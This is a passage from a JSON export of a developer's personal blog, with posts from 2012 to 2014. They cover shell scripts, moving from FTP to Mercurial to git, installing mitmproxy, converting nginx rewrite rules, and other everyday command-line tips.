way.</p>",
  "publish_start": "2012-08-30 07:24:36",
  "slug": "zsh-autocompletion-git-unstage"
}, {
  "id": 342,
  "name": "Spectrum, a script to see your terminal 256 colors",
  "text": "<p>Here is a little script I hacked together to display in your terminal all the colors available in the 256 color spectrum, as well as a visual representation of them.</p>\n<p><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"http://s3.pixelastic.com/files/2012/09/06/504834cb-df14-4fa6-a08c-763445a3e447/spectrum2.png\" alt=\"Screenshot of spectrum output\" /></p>\n<p>The <code>oh-my-zsh</code> project actually ships with a method named <code>spectrum</code> that does pretty much the same thing, but I found that it was hard to actually get a real feel of what the color where with the original output. So I coded this one.</p>\n<p>It does not display the colors in the range <code>{000..015}</code> because those are dependent on your terminal configuration. Also, the output is split in blocks of 6 lines, with 2 blocks displayed side by side. You can modify those values in the script if you want to make it easier to read on you screen. I use 2 and 6 because it is what is the more readable on my tiny netbook screen.</p>\n<p>Ok, enough talk, here is the script</p>\n<pre><code>#!/usr/bin/zsh\n# Display the terminal 255 colors by blocks\n\n\n# Long space is long\nlocal space=\" \"\nfor i in {0..22}; do space=$space\" \"; done\n\n# Number of color lines per block\nlocal lines=6\n# Number of blocks per terminal line\nlocal blocks=2\n\n# Tmp var to hold the current line in a block \nlocal m=0\n# Tmp var to hold how many blocks are filled\nlocal b=0\ntypeset -A grid\n\n# We want to display the blocks side by side, so it means we'll have to create\n# each line one my one then display all of them, and after that jump to the\n# next set of blocks\nfor color in {016..255}; do\n    # Current line in a block\n    m=$((($color-16)%$lines))\n\n    # Appending the displayed color to the line\n    grid[$m]=$grid[$m]\"^[[01m^[[38;5;${color}m#${color} ^[[48;5;${color}m${space}^[[00m  \"\n\n    # Counting how many blocks are filled\n    [[ $m = 5 ]] &amp;&amp; b=$(($b+1))\n\n    # Enough blocks for this line, display them\n    if [[ $b = $blocks ]]; then\n        # Reset block counter\n        b=0;\n        # Display each line\n        for j in {0..5}; do\n            echo $grid[$j]\n            grid[$j]=\"\"\n        done\n        echo \"\"\n    fi\ndone\n\n# Display each remaining blocks\nfor j in {0..5}; do\n    echo $grid[$j]\n    grid[$j]=\"\"\ndone\n</code></pre>\n<p>Oh and one last word. You might want to pipe the output to <code>less</code> to make it easier to read if you're on a small screen like me.</p>",
  "publish_start": "2012-09-06 08:06:35",
  "slug": "spectrum-script-terminal-256-colors"
}, {
  "id": 343,
  "name": "From no versioning to git",
  "text": "<p>When I started working as a professional web developer, I wasn't using any versioning system. When I needed to add a new feature to an existing website, I just coded it and then uploaded it by FTP.</p>\n<p>Sometimes, it turns out that the feature was a failure, and that I needed to get back to a previous version. Most of the time, I remembered the old feature and could just type the old code back. Other times, I couldn't and getting the website back to its previous state was a nightmare.</p>\n<p>So whenever I felt a feature could go wrong, I started creating manual backup of files before editing them, prefixing them with <code>-version2</code> and such. It worked ok at first, but after some time, it was impossible, even for me to tell the different versions appart.</p>\n<p>I also started to realize a trend on the web, reading from other developers, that there was something call a version-control system. I thought I needed to use one of them, to keep track of different version of files.</p>\n<p>I wasn't exactly sure which one was right for me, so I asked a few friends. Most of them told me they were using Subversion at work, but that it had a few shortcomings, but that it was still better than nothing. Another friend told me that he was using Mercurial, both for personal projects and at work, at that his whole team was actually versioning everything with it and were very happy about it.</p>\n<h4>First steps with mercurial</h4>\n<p>So I thought I should start using Mercurial. If I have to learn a new tool, I'd rather take one that works well and where I have a friend able to help me on my first steps.</p>\n<p>Back in these days, I was still using Windows so I downloaded and installed Mercurial and its GUI version, TortoiseHG. I was quite happy with it the instant I installed it. I could just \"commit\" (which was a new word for me) my changes and know for sure that they were safe and that I could get back to previous versions of my file easily.</p>\n<p>I was committing all my changes at the end of each day, writing a long commit message listing everything I had done in that given day. Then, the next morning I could just re-read the previous commit message and remember what I was doing. The commit message worked a bit like a todo list for what needed to be done.</p>\n<p>I was mostly using Mercurial as a backup system. I even opened an account on BitBucket where I uploaded my changes every day, in the case my laptop crashed, I still had backups of everything online.</p>\n<h4>A little note about FTP</h4>\n<p>Using Mercurial had another benefical side-effect on my productivity. It made me discover how backward FTP upload was. Before using Mercurial, when I needed to add changes to a website, I connected to the server with FTP and transfered every changed files from my local machine to the server.</p>\n<p>Of course, I had to remember which files I changed, and upload them one by one. This was tedious. I had to move from directory to directory before copying the files. I can't tell you how many times I had a bug in production that I couldn't replicate on my local machine, just because I either forgot to upload a file or uploaded it in the wrong place.</p>\n<p>Sometimes just to be sure to upload all the files on their correct places, I simply uploaded the full website directory and let the FTP software choose if they needed to be updated or not. But this took ages as the software had to send a request to compare timestamp modification date for each file.</p>\n<p>And if I only had two files changed, I had to wait for the FTP to scan each file between the first and the second one before it gets uploaded. This too resulted in bug reports from customer that I couldn't replicate, even on production because by the time I get to check the website, the missing file that was causing the error had been uploaded and everything worked perfectly for me. In the end, it created a list of \"ghost bugs\" that I was never sure if they were real bugs or created by the FTP upload lag.</p>\n<p>Mercurial get rid of all this crap because it was clever enough to know which files were changed from the last deployment, and even which part of the files where changed, sending only the difference. This resulted in much faster upload time and no more errors in missing files. Also, I got bonus security points for transferring through ssl and not clear text FTP.</p>\n<p>Sorry for this little FTP disgression. Anyway, as you remember I was using Mercurial as a backup system more than a version-control system. Commiting once a day became cumbersome as I wanted more fine-tuning on what I commited. I ended up commiting twice a day, or even every time I took a break, but then I realized it made much more sense to commit based on feature and not on time.</p>\n<h4>No more Mercurial</h4>\n<p>And that's when Mercurial started to get in the way. I often worked on a feature and while doing that, spotted tiny bugs or typos that I fixed while working on the big feature. I wanted to commit only related changes together, and didn't manage to do that well with Mercurial.</p>\n<p>I guess this is because I did not really understand how Mercurial worked back in these days, but to be honest I do not understand it better now. Whenever a file is modified in Mercurial, it is ready to be added to the next commit. But when you create a new file or delete one, you have to tell Mercurial that you want this add/delete to be registered in the next commit.</p>\n<p>As I said, I sometime just fixed small bugs or typos in files that had not much to do with the feature I was working on at that moment. I would have like to be able to commit only these files, and not the others. I never really managed to make it correctly with Mercurial so in the end I was still commiting more files that I wanted to.</p>\n<p>That's when I considered trying git instead of Mercurial. I made some googling on \"git vs Mercurial\" to see how they differ and the general consensus seems to be that git is more low level than Mercurial. Git has a plethora of commands, most of them you'll never use, while Mercurial is focused on a workflow for the end user that works well. Also, git allow the user to rewrite its history.</p>\n<p>After reading all this I was convinced Mercurial was the right tool for me. I was still struggling with my current version system, I didn't want to try one that was even more hard to understand. Plus, rewriting history ? I don't want that to happen in real life, I sure don't want that to happen with my files either.</p>\n<p>So I digged deeper in Mercurial, trying to understand it better, to grok it but no, really, I still could'nt make it behave the way I'd like to work with my files so I finally decided to give git a try.</p>\n<h4>First steps with git</h4>\n<p>Because there was this thing named github, and all the cool kids where on github, and I too wanted to participate in those big open source projects and I felt like I was held back by the tool I was using.</p>\n<p>On my first hours of using git I managed to do what I had struggled to do with Mercurial for so long. I could easily choose which files to commit or not and split my work in several commits. Of course, I could never have done it without google. Git man pages are gibberish and the command line commands and options list is so vast I felt lost. Even when I found what I needed I wondered why the git developers choosed to give them such abstract names without any apparent cohesion in the complete git API.</p>\n<p>I had to create <a href=\"https://github.com/pixelastic/oroshi/blob/master/config/git/gitconfig\">aliases</a> to do my day to day tasks with git so as not to remember and type all these <a href=\"https://github.com/pixelastic/oroshi/blob/master/config/zsh/aliases-git.zsh\">crazy commands</a>, but in the end it turns out ok. I keep running into problems, but none that the help of google, StackOverflow and the incredibly rich git API can't solve.</p>\n<p>I'm now versioning any new project with git and even converted some old projects from Mercurial to git. I know I'm still in the early stages of learning git (I've only started using branches extensively since a few weeks) but I do really enjoy it a lot.</p>\n<h3>What's next ?</h3>\n<p>I've done all my git training by myself, while in New Zealand for a year, away from work and just for fun. I know that when I'll get back to Paris and start looking for a new job I'd like to find a place where the day-to-day workflow involves git because I really want to see the way branching and merging helps people work together building bigger things.</p>",
  "publish_start": "2012-11-21 03:45:15",
  "slug": "versioning-git"
}, {
  "id": 344,
  "name": "Back in Paris !",
  "text": "<p>After one year in New Zealand, I'm now back in Paris. The trip to New Zealand was one of the best years of my life, I discovered so many things and places, met so many people, that it changed me in more ways that I can really count. It also greatly influenced the way I want to work.</p>\n<p>Being back in Paris, I now need to find a new job. I could go back to freelancing, but I don't really want to. Freelancing had its advantages, but also some important downsides. The biggest one being that you're mostly working alone, and jumping from one project to the next.</p>\n<p>I now want to work in a team, to teach, and to learn. Sharing with others what I know and learning from them what I don't is one of the most important things I'm now looking in my job.</p>\n<p>I also want to be working on one big project instead of countless small ones. When you're freelancing, you're working on a project for weeks or months, creating a website from scratch and making it take a life of its own, line after line. But in the end, you hand it over to the guy who paid you to do it. And you never really get to see it growing. I now want to work on a project that I'll be able to follow, fix, and improve, days after days once it is launched in the world.</p>\n<p>In New Zealand, I have been a WWOOFer (Willing Worker On Organic Farms) for over 8 months. All this was possible through the wwoofing website. Now, back in France I extensively use services such as couchsurfing, airbnb or blablacar. I love the way those websites allow people to meet through their services. I've met very interesting people thanks to that and I'd love to work for a company that can help linking people together.</p>\n<p>On a more technical-oriented side, I also want to change my tools. I've been making websites for the past 10 years, coding the server side part in PHP. I now want to try something else. I used my time in New Zealand to learn a new language on my own. I first tried Python, but couldn't really go anywhere with it. I then tried Ruby and this was like discovering a new world. Writing and reading Ruby seems like writing and reading prose. I haven't yet build any website with Ruby, but coming from a cakePHP background, I guess Ruby on Rails will seem natural to me. I now use Ruby extensively for my own scripting, be it for changing a subtitle <code>.srt</code> fps, automatically synchronizing my cellphone files with my laptop, batch updating my mp3 tag collection and mostly any tedious task that involves scripting on my day-to-day life. I haven't got the chance to try node.js yet, but that's definitely next on my todolist.</p>\n<p>Following the same idea, I also want to get to better use git and its collaborative features. I've only used subversion in a team, and the experience wasn't that great. Or I've used git, but only for myself as I was the only developper and I'm sure I only used it to barely 10% of what it could do. I've also tried to follow the TDD principle of writing tests first and then the code to make the test pass. I managed to do it once or twice, but the whole process seemed so long and difficult that I'm pretty sure I've missed something here, and would like to have someone to show me how they do it.</p>\n<p>On a related note, I now try to free as much code as I can through open-source, but I'd like to do even more. I currently only share small scripts without tests and with scarce documentation. I know I could do better than that, but I'll need someone to show me the way.</p>\n<p>I've managed to switch from Windows to Ubuntu in the past years and can't imagine going back. Working with your filesystem from inside a terminal and writing scripts to make your life easier is so powerful that I cannot go back to a GUI OS now. I've also ditched a classical IDE, namely Komodo Edit, for something different, namely vim. The switch has been hard at first, but now all the vim keys are binded to my muscle memory and I love vim for all the exact same reasons I love a terminal : you can script your tasks !</p>\n<p>This is only a small subset of the technical changes I've already made or am currently making. I'd like to find a job where I'm hired, not for my past skills, but for the skills I want to develop. I currently have a resume where I can attest extensive experience with PHP, but that's not what I want to do in my future.  What I want to do is, obviously, not on my resume. That is currently the tricky part I have to face when looking for a job.</p>\n<p>As you can see, I have a pretty good picture of the kind of place I want for my next job. Luckily, I'm living in Paris, with a lot of job opportunities and I'm pretty sure I'll manage to find a place that match most of it. If you're currently hiring, and my expectations meet yours, don't hesitate to shoot me an email.</p>",
  "publish_start": "2013-07-22 13:41:17",
  "slug": "paris"
}, {
  "id": 345,
  "name": "Installing mitmproxy",
  "text": "<p>I spend the last hour trying to install <a title=\"mitmproxy\" href=\"http://mitmproxy.org/\" target=\"_blank\">mitmproxy</a>. This is supposed to be a commandline proxy to intercept, read, edit and replay HTTP(S) requests. I say \"supposed\" because I haven't had the chance to try it so far as I was blocked on a compilation error.</p>\n<p>According to <a href=\"http://mitmproxy.org/doc/install.html\" target=\"_blank\">the official documentation</a>, installing mitmproxy should be as easy as <code>pip install mitmproxy</code>. Being new to using <code>pip</code>, I first had to install it (<code>sudo apt-get install python-pip</code>) and figure out that one need to install stuff with <code>pip</code> using <code>sudo</code>.</p>\n<p>But <code>sudo pip install mitmproxy</code> resulted in charming compilation errors in my case. Something along the lines of :</p>\n<pre><code lang=\"ini\">src/lxml/lxml.etree.c:16:20: fatal error: Python.h: No such file or directory<br /></code></pre>\n<p>After a bit of googling, I understood that the issue was some missing headers on my part. After running <code>sudo apt-get install python-dev</code> I was good to run a <code>sudo pip install mitmproxy</code> again.</p>\n<p>Next step will be to configure the beast and learn how to use it.</p>",
  "publish_start": "2013-08-26 00:27:55",
  "slug": "installing-mitmproxy"
}, {
  "id": 346,
  "name": "Doxie + Dropbox + Ikea = Love",
  "text": "<p>Thanks to <a title=\"Get Doxie !\" href=\"http://getdoxie.com/\">doxie</a> and <a href=\"http://www.dropbox.com/\">dropbox</a>, I'm going the paperless way. Every important paper I get in my physical mailbox, I now scan and put on the cloud. I have been doing it for bills, medical papers, tickets, warranty and am now even doing it for Ikea instruction booklets.</p>\n<p>This way, when I'll be moving to a new appartement, I'll still be able to dismantle and rebuild my furniture, even if they have gone out of production.</p>\n<p>As a gift, here are the links :</p>\n<ul>\n<li><span style=\"font-size: 9pt;\"><a href=\"https://www.dropbox.com/s/xdv1u9dk80488ly/Ikea%20-%20Colonne%20Expedit.pdf\">Expedit Column 1x5</a></span></li>\n<li><span style=\"font-size: 9pt;\"><a href=\"https://www.dropbox.com/s/x3c6sm31xpbnijf/Ikea%20-%20Meuble%20t%C3%A9l%C3%A9%20Expedit.pdf\">Expedit Tv unit</a></span></li>\n<li><a href=\"https://www.dropbox.com/s/9ja1n497x9h186a/Ikea%20-%20Lit%20Brimnes.pdf\">Brimnes bed</a></li>\n<li><a href=\"https://www.dropbox.com/s/f7l5kw5ox6q45pi/Sommier%20Ikea%20Sultan%20Lodingen%20Booklet.pdf\">Sultan Lodingen</a></li>\n<li><a href=\"https://www.dropbox.com/s/3agihtb9akad7vm/Ikea%20-%20Fauteuil%20Nils.pdf\">Nils chair with armrest</a></li>\n</ul>",
  "publish_start": "2013-08-26 15:24:24",
  "slug": "doxie-dropbox-ikea-love"
}, {
  "id": 347,
  "name": "Downloading from Youtube for offline watching",
  "text": "<p>Call me old fashioned but I do not really like the \"always connected\" motto that the industry is following right now. I like to have physical music and video files on my hard drive, so I can access them anywhere, anytime, without relying on me being connected to a network.</p>\n<p>And yes, I get the irony of talking about <em>physical </em>files<em>.</em></p>\n<p>Anyway, I now download movies directly from <a href=\"http://youtube.com/\">Youtube</a>, <a href=\"http://www.dailymotion.com/\">Dailymotion</a>, <a href=\"http://www.vimeo.com/\">Vimeo</a> and consorts, copy them to my smartphone, and watch them in the train, waiting queues or bed.</p>\n<p>To achieve that, here are the command-line tools I'm using. First is <a href=\"https://github.com/rg3/youtube-dl\">youtube-dl</a>, and as its name does not imply at all, it can download from more than Youtube. The second one is <a href=\"https://github.com/bf4/vimeo_downloader\">vimeo_downloader</a> which is specialised in downloading from Vimeo. And the last one is the more generic <a href=\"http://code.google.com/p/get-flash-videos/\">get_flash_videos</a> that can download from a variety of smaller websites.</p>\n<p>All those scripts accepts the video url as parameter.</p>\n<p>Happy scripting and happy viewing !</p>",
  "publish_start": "2013-08-27 17:45:44",
  "slug": "downloading-youtube-offline-watching"
}, {
  "id": 348,
  "name": "Converting files to UTF-8 from the command line",
  "text": "<p>Converting to and from charset encoding is boring. Life would be much easier if everything was saved in proper UTF-8.</p>\n<p>I just coded a couple of scripts that will help be read file encoding from files and convert them to UTF-8.</p>\n<p>First, not all encoding can be easily read. Some uses markers that are easy to check, other requires heuristic and guessing. I won't deal with the second part. Most of the files I'm currently handling are either Latin1 (ISO-8859-1) or Latin2 (ISO-8859-2), so I'll limit the scope of my scripts to those two sets.</p>\n<p>Fortunatly, the default <code>file</code> command can do that.</p>\n<pre><code lang=\"sh\">$ file -bi file.txt<br />text/plain; charset=us-ascii<br />$ file -bi bad.html<br />text/html; charset=iso-8859-1<br />$ file -bi good.html<br />text/html; charset=utf-8</code></pre>\n<p>Now that we have a way to know the input encoding, we can use <code>recode</code> to convert to UTF-8. You can install <code>recode</code> easily with <code>sudo apt-get install recode</code>.</p>\n<p>Once done, it is just a matter of <span style=\"font-family: 'Courier New', monospace;\">convert latin1..utf8 bad.html</span></p>\n<p>I wrapped those methods in two scripts : <a href=\"https://github.com/pixelastic/oroshi/blob/master/scripts/bin/encoding\">encoding</a> and <a href=\"https://github.com/pixelastic/oroshi/blob/master/scripts/bin/utf8\">utf8</a> that respectively output the file encoding and convert the file to utf8.</p>",
  "publish_start": "2013-08-30 12:11:22",
  "slug": "converting-files-utf-8-command-line"
}, {
  "id": 349,
  "name": "Renaming files to fit on a FAT32 drive",
  "text": "<p>When moving files from my hard-drive (formatted in ext3) to my mp3 music player or to any drive formatted in FAT32, some files never get to the destination due to illegal characters in their filename.</p>\n<p>Those includes characters like question marks, colons or quotes which can be quite common in media filenames.</p>\n<p>So I wrote myself a <a href=\"https://github.com/pixelastic/oroshi/blob/master/scripts/bin/rename-fat32\">tiny command-line script</a> to make the filenames FTA32 compliant. Note that this is a destructive operation as it will simply remove the illegal characters.</p>",
  "publish_start": "2013-08-31 13:37:39",
  "slug": "renaming-files-fit-fat32-drive"
}, {
  "id": 350,
  "name": "git resurrect to bring back deleted files from the dead",
  "text": "<p>Ever deleted a file several commits away and then suddenly realizing that you actually need it ? Well, here's an easy way to get your file back.</p>\n<p>First of all, we'll get the commit in which the file has been deleted with : <code>git log --diff-filter=D --format=format:%H -- {your_filename}</code></p>\n<p><code>--diff-filter=D</code> will only keep commits where files gets deleted, <code>--format=format:%H</code> will only display the commit hash and finally the <code>--</code> is a separator between your options and the argument. Argument should be your filename, and it even accepts <code>*</code> as a wildcard.</p>\n<p>Once you got the commit hash, it's just a matter of checking the file out using <code>git checkout {hash}~1 {your_filename}</code>. The <code>~1</code> targets the previous commit, right before the file gets deleted.</p>\n<p>All wrapped up in a nice shell script, here is what it looks like :</p>\n<pre><code lang=\"sh\">#!/usr/bin/env bash <br /><span style=\"font-size: 9pt;\">filename=$1  <br /># We first find the commit where the file was deleted <br />hash=$(git log --diff-filter=D --format=format:%H -- $filename)  <br /># We then bring it back from the dead <br />git checkout $hash~1 $filename</span></code></pre>\n<p>I've aliased mine to <code>git resurrect</code>.</p>",
  "publish_start": "2013-09-02 08:43:47",
  "slug": "git-resurrect-bring-deleted-files-dead"
}, {
  "id": 352,
  "name": "Converting html files to pdf from the commandline",
  "text": "<p>When you need to convert an <code>html</code> file to a <code>pdf</code>, often the default <code>pdf</code> printer of your OS is enough. For those times when you need a much better rendering, you need a better tool.</p>\n<p>I had to convert my <code>html</code>/<code>css</code> resume to a <code>pdf</code> file today. The default <code>pdf</code> printer on Ubuntu was discarding the background color and adding useless margins.</p>\n<p>I finally resorted to using <a href=\"http://code.google.com/p/wkhtmltopdf/\">wkhtmltopdf</a>. It does the job, but needs a few tweaks. First, you have to add <code>-T 0 -R 0 -B 0 -L 0</code> to remove the margins. Then, you have to use the <code>file://</code> notation to target a local file. Also, it does not understand the css properties <code>page-break-after</code> nor <code>page-break-before</code>. I had to manually add padding in my elements to stop them from being cut in between two pages. <span style=\"font-size: 9pt;\">But worst of all, it chokes on UTF-8 characters in filenames.</span></p>\n<p><span style=\"font-size: 9pt;\">In the end, I wrote a small ruby wrapper around wkhtmltopdf to work around all those issues for me and called it <a href=\"https://github.com/pixelastic/oroshi/blob/master/scripts/bin/html2pdf\">html2pdf</a>.</span></p>",
  "publish_start": "2013-09-05 16:23:49",
  "slug": "converting-html-files-pdf-commandline"
}, {
  "id": 351,
  "name": "Preventing the Meta key from opening the dash in Unity Ubuntu",
  "text": "<p>Everytime I install Ubuntu on a fresh computer and try to define custom keybindings that use the meta (ie. Windows) key, I run into issues.</p>\n<p>The Ubuntu UI uses the meta key to open what they call the \"Dash\". I never use it and want my meta key back to define my own keybindings.</p>\n<p>There is no way to disable it from the default Ubuntu options. You have to install <code>compizconfig-settings-manager</code> and launch it using <code>ccsm</code>. There, go to the Ubuntu Unity Plugin and disable the \"Key to show the launcher\" binding.</p>\n<p>You will now be free to use the meta key in your keybindings, again.</p>",
  "publish_start": "2013-09-02 15:22:15",
  "slug": "preventing-meta-key-opening-dash-unity-ubuntu"
}, {
  "id": 355,
  "name": "Alternate cp and mv commands using rsync",
  "text": "<p>Sometime you need to copy or move files, but preserve their ownership, timestamp or simply want to update the changing bits instead of blindly moving whole chunks of data.</p>\n<p>I have two simple aliases to do just that. Meet <code>rcp</code> and <code>rmv</code> :</p>\n<pre><code lang=\"sh\">function rcp() { rsync -rahP --modify-window=1 \"$@\" } <br />function rmv() { rsync -rahP --modify-window=1 --prune-empty-dirs --remove-sent-files \"$@\" }<br />compdef _cp rcp rmv </code></pre>\n<p>They are defined as functions and not aliases so I can define which completion functions zsh will use (that's the <code>compdef</code> part). In that case, I want them to use the same completion as for the basic <code>cp</code> command.</p>",
  "publish_start": "2013-09-09 15:44:41",
  "slug": "alternate-cp-mv-commands-rsync"
}, {
  "id": 354,
  "name": "Télécharger ParisWeb 2012 sous forme de podcasts",
  "text": "<p><em>Note for my English readers : In this post in French, I'm talking about how to download the audio version of the ParisWeb 2012 talks. As those talks are mostly in French, it wouldn't make much sense for me to write about it in English.</em></p>\n<p>J'ai raté ParisWeb 2012, mais comme je n'ai pas envie de complétement rater tout ce qui a pu s'y être dit, j'ai décidé de télécharger l'ensemble des vidéos des conférences, les convertir en audio et les écouter sous forme de podcast sur mon lecteur mp3.</p>\n<p>Heureusement, les gens de ParisWeb ont déjà fait 90% du travail en proposant sur le site officiel des liens vers l'ensemble des conférences en vidéo sur Dailymotion. Après, je n'ai eu qu'à scripter rapidement un crawler qui télécharge et convertit tout cela automatiquement.</p>\n<p>Vous pouvez trouver le code sur <a href=\"https://gist.github.com/pixelastic/6494754\">ce gist</a>.</p>\n<p>TODO: Actuellement je télécharge la totalité de la vidéo (pouvant atteindre plusieurs Go) pour n'en extraire qu'un fichier audio de quelques dizaines de Mo. De plus, l'audio ne semble pas correctement reconnaitre le stéréo.</p>",
  "publish_start": "2013-09-09 14:54:29",
  "slug": "telecharger-parisweb-2012-sous-forme-de-podcasts"
}, {
  "id": 356,
  "name": "Commandline escaping magic",
  "text": "<p>Aren't your tired of having to wrap your url in quotes when using <code>wget</code> so the various <code>&amp;</code> and <code>?</code> do not mess up your terminal ?</p>\n<p>Well, I was, until I stumbled upon this god-send zsh magic : <code>url-quote-magic</code>.</p>\n<p>Just initiate it in your <code>.zshrc</code> with the following lines :</p>\n<pre><code lang=\"sh\">autoload -U url-quote-magic <br />zle -N self-insert url-quote-magic<br /></code></pre>\n<p>And now, everytime you type or paste a url in <code>wget</code> it will automatically escape the needed characters. It is quite clever and works with other commands that would otherwise trigger your terminal globbing feature.</p>",
  "publish_start": "2013-09-09 15:51:24",
  "slug": "commandline-escaping-magic"
}, {
  "id": 357,
  "name": "Understanding nginx location blocks and rewrite rules",
  "text": "<p>I recently moved a cakePHP website from an Apache server to an Nginx one. I had to translate url rewriting rules from one syntax to the other, and here is what I learned.</p>\n<p>First of all, Nginx internal logic for processing rewrite rules is not as straightforward as Apache. In Apache, rules are processed in the order in which they appear in your config file/<code>.htaccess</code>. In Nginx, they follow a more complex pattern.</p>\n<h4>Initial Apache rules</h4>\n<p>First of all, here are the (simplified) set of rules I had to convert :</p>\n<pre><code lang=\"apache\">RewriteRule ^(css|js)/packed_(.*)$ $1/packed/$2 [L]<br /><br />RewriteRule ^files/([0-9]{4})/([0-9]{2})/([0-9]{2})/([[:alnum:]]{8}-[[:alnum:]]{4}-[[:alnum:]]{4}-[[:alnum:]]{4}-[[:alnum:]]{12})/(.*)\\.(.{3,4})\t/files/$1/$2/$3/$4.$6 [L]<br /><br />RewriteCond %{REQUEST_FILENAME} !-d<br />RewriteCond %{REQUEST_FILENAME} !-f<br />RewriteRule ^(.*)$ index.php?url=$1 [QSA,L]<br /><br /></code></pre>\n<p>The first rule deals with compressed <code>css</code> and <code>js</code> files. Minified <code>css</code> and <code>js</code> files are saved in <code>/css/packed/</code> with a filename made of a md5 hash of the original filenames and a timestamp. So a url of <code>/css/packed_6e4f31ffc48b6_1330851887.css</code> will actually return the file located in <code>/css/packed/6e4f31ffc48b6_1330851887.css</code></p>\n<p>The second rule is about media files uploaded on the server. Each uploaded file is stored in the <code>/files/</code> directory, in a subfolder made from the uploading date (like <code>/files/2012/08/25/</code>). The actual file is given a UUID when saved, and this UUID is used as its filename on disk. The rewrite rule allow the use of any custom filename when linking the file. This helps for SEO purposes as well as making it more user-friendly when we present a download to our users. <span style=\"font-size: 9pt;\">So <code>/files/2012/08/25/50483446-4b00-4d5b-8498-763e45a3e447/Subscription_form.pdf</code> actually returns the file at <code>/files/2012/09/06/50483446-4b00-4d5b-8498-763e45a3e447.pdf</code></span></p>\n<p>And the last rule is the default cakePHP rewrite rule. It first checks if the requested url points to an existing directory or file, and if not dispatch it to the main entry point : <code>index.php</code> with the requested url as a parameter.</p>\n<h4>Converting it to Nginx</h4>\n<p>Rewrite rules in Nginx are usually found in <code>location</code> blocks. There are several ways you can define a <code>location</code> block, and it affects the order in which the rules will be parsed.</p>\n<p>Nginx first checks for <code>location =</code> blocks. Those blocks are used to catch an exact match of the requested url. Once such a block is found, its content is applied, and Nginx stops looking for more matches.</p>\n<pre><code lang=\"ini\">location = /my-exact-file.html {<br />\trewrite /my-exact-file.html http://external-website.com/<br />}</code></pre>\n<p>In this example, a request for <code>/my-exact-file.html</code> will be redirected to <code>http://external-website.com.</code> Note that you need to repeat the url in both the <code>location =</code> block and the <code>rewrite</code> rule.</p>\n<p>The <code>location =</code> is of very limited use as it only accepts an exact match on a string. Much more useful are the <code>location ~</code> blocks that performs matches on regex (and the <code>location ~*</code> for a case-insensitive version).</p>\n<p>Such blocks are tested after the <code>location = </code>ones, in the order they appear in your configuration file. Once a block matches, Nginx applies its content but does not stop. It keeps looking for other blocks that might match and apply them. It's up to you, in the block content, to define if the parsing should stop, using the <code>break</code> command.</p>\n<pre><code lang=\"ini\">location ~ /(css|js)/packed_ {<br />\trewrite ^/(css|js)/packed_(.*)$ /$1/packed/$2 break; <br />}  <br />location ~ /files {<br /> \trewrite ^/files/(.*)/(.*)/(.*)\\.(.*)$ /files/$1/$2.$4 break;<br />}</code></pre>\n<p>In the first rule I'm looking for any <code>/css/packed_*</code> or <code>/js/packed_*</code> request, and converting them to <code>/css/packed/*</code> or <code>/js/packed/*</code>. Note the use of backreferences in the rewrite using <code>$x</code> variables. In the second rule I simplified the original regex from Apache to catch the <code>/2012/08/23/</code> in <code>$1</code>, the UUID in <code>$2</code>, the filename in <code>$3</code> and the extension in <code>$4</code> and rewriting the request to the correct file on disk.</p>\n<p>Both rewrites ends with the <code>break</code> flag. It tells Nginx that it should stop looking for other <code>location ~</code> blocks matching the requested url and just serve the file. Another useful flag is <code>last</code>, which tells Nginx to restart its whole url matching process from the beginning but this time using the newly rewritten url.</p>\n<p>There is one last <code>location</code> block that we can use, and it's the simple <code>location</code>, without any prefix. These <code>location</code> blocks will be checked last, if no <code>location =</code> or <code>location ~</code> had stopped the processing. They are especially good for a last \"catch all\" solution, and we are going to use them to dispatch urls to <code>index.php</code></p>\n<pre><code lang=\"ini\">location / {<br /> \ttry_files $uri /index.php?url=$request_uri; <br />}<br /></code></pre>\n<p>Using <code>location /</code>, we'll catch any remaining requests. The <code>try_files</code> command will test every one of its arguments in order to see if they exist on disk and serve them if they do. So in our example it will first check for the requested uri, and if such a file exists, will serve it. Otherwise it will simply dispatch it to the main <code>index.php</code> with the requested url as an argument and cakePHP will do the rest.</p>\n<p>There is one last thing we must do, it's telling Nginx to pass any <code>.php</code> file to the PHP fastcgi. This is quite easy using a <code>location ~</code> block matching any <code>.php</code> file. This will even apply to files served through <code>try_files</code>.</p>\n<pre><code lang=\"ini\">location ~ \\.php$ {<br /> \tfastcgi_pass   127.0.0.1:9000;<br /> \tfastcgi_index  index.php;<br /> \tfastcgi_intercept_errors on;<br />\tinclude fastcgi.conf;<br />}<br /></code></pre>\n<h4>Conclusion</h4>\n<p>Wrapping your mind around the order in which Nginx applies your rewrites is not easy at first. I hope this post helped you making sense of it.</p>\n<p>Note that there also is the <code>location ^~</code> block but I found it to be of very limited used as its behavior can be replicated with the more generic <code>location ~</code> blocks.</p>",
  "publish_start": "2013-09-27 10:18:21",
  "slug": "understanding-nginx-location-blocks-rewrite-rules"
}, {
  "id": 358,
  "name": "UTF-8 encoding for included .jsp files",
  "text": "<p>Today I had to split a gigantic <code>.jsp</code> file into several smaller files. I used the <code>&lt;@include file=\"./path/to/file.jsp\"&gt;</code> syntax in order to do this.</p>\n<p>Unfortunatly, all the included files were displayed with garbage instead of UTF-8 characters.</p>\n<p>So I ran the list of usual suspects : - <code>Content-Type:text/html; charset=utf-8</code> is correctly returned by my server. - <code>&lt;meta charset=\"utf-8\"&gt;</code> is the first element of my <code>&lt;head&gt;</code>. - No data is being fetched from a database, so it cannot come from there. - All my files are correctly encoded in UTF-8.</p>\n<p>Also, I added a <code>&lt;%@ page contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt;</code> as the very first line of my main <code>index.jsp</code>. I also added the following code to <code>pom.xml</code> to make <code>UTF-8</code> the default encoding :              [...]         UTF-8</p>\n<p>Any <code>UTF-8</code> in the main <code>index.jsp</code> was fine, but as soon as it was in an included it was displayed as garbaged. At first, I manually added <code>&lt;%@ page pageEncoding=\"UTF-8\"%&gt;</code> to every included page and it fixed the issue. But as I was dealing with dozen of included files, I needed a more generic solution.</p>\n<p>Turns out that I had to edit my <code>web.xml</code> file and add the following configuration :</p>\n<pre><code>&lt;jsp-config&gt;\n    &lt;jsp-property-group&gt;\n        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;\n        &lt;page-encoding&gt;UTF-8&lt;/page-encoding&gt;\n    &lt;/jsp-property-group&gt;\n&lt;/jsp-config&gt;\n</code></pre>\n<p>And it worked !</p>",
  "publish_start": "2014-01-07 14:09:52",
  "slug": "utf-8-encoding-included-jsp-files"
}]
